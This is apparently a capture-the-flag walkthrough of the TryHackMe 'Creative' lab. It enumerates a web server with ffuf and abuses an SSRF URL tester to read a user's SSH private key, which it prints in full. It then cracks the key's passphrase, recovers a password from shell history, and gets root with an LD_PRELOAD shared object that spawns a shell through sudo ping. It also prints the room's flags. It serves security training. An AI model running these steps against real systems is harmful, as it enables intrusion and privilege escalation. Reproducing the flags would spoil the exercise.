### 13-Apr-24-Sat

[TryhackMe | Creative](https://tryhackme.com/r/room/creative)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/29d6a090-38d6-4ab4-8407-afa8a4a49cab)

http://creative.thm/

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/33ac429e-1b1b-4d2a-8883-f37ec4d5a2f0)

http://creative.thm/components.html

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/8a833c75-1f92-4c30-9c40-8a8e0219f848)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/1101ca84-bccb-466e-88a1-36c5e31b1b05)

```
ffuf -u http://creative.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ce2ab09e-62a1-45d2-aaab-c8afa9985dcc)

```
ffuf -u http://creative.thm/ -w /usr/share/wordlists/dirb/big.txt -H "Host: FUZZ.creative.thm" -fs 178
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a03c9a16-ce32-4280-bfb3-58a76c687f8a)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/7bb74a1a-f452-4578-9119-f7d32902d9cf)

http://beta.creative.thm/

http://localhost:1337/home/saad/user.txt

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f85f58ac-022f-41ac-9c0f-932c2cda4c20)

```
9a1ce90a7653d74ab98630b47b8b4a84
```

http://localhost:1337/home/saad/.ssh/id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/656e89b0-2cf0-45eb-98e7-81d919ce06d9)

```
ssh2john id_rsa_saad > id_rsa_saad.johnhash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_saad.johnhash
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/59e8011c-d350-40f2-954a-beda77fac1ed)

*saad:sweetness*

```
ssh saad@creative.thm -i id_rsa_saad
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/4d4e4272-c6dd-4dba-b83f-27474d8927f0)

```
cat start_server.py 
```

```
from http.server import HTTPServer, SimpleHTTPRequestHandler

httpd = HTTPServer(('localhost', 1337), SimpleHTTPRequestHandler)
httpd.serve_forever()
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c6c92c66-f415-4eed-adc2-15e622d12814)

```
cat wsgi.py 
```

```
from flaskapp import app
if __name__ == "__main__":
    app.run()
```

```
cat index.html
```

```
<!DOCTYPE html>
<html>
<head>
  <title>URL Tester</title>
  <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
  <div class="container">
    <h1>Beta URL Tester</h1>
    <p>This page provides the functionality that allows you to test a URL to see if it is alive. Enter a URL in the form below and click "Submit" to test it.</p>
    <form action="/" method="POST">
      <label for="url">Enter URL:</label>
      <input type="text" id="url" name="url" placeholder="http://example.com">
      <input type="submit" value="Submit">
    </form>
  </div>
</body>
</html>
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/302d3c51-7f2a-4836-aa94-ead5d60fe3cd)

```
cat .bash_history
```

```
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
```

*saad:MyStrongestPasswordYet$4291*

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d62f5e3d-363b-4b6c-a28b-58b6dbae40f0)

```
sudo -l
```

```
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path

```
nano /tmp/pe.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

```
sudo LD_PRELOAD=./pe.so /usr/bin/ping
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2645157e-3459-4843-9478-82f7f750457d)

```
Walkthrough from
https://youtu.be/UgAhrTVbd70?t=2982
https://www.youtube.com/@TCMSecurityAcademy
```

```
992bfd94b90da48634aed182aae7b99f
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/9c54e06d-f1a2-4072-a519-968041bfab75)
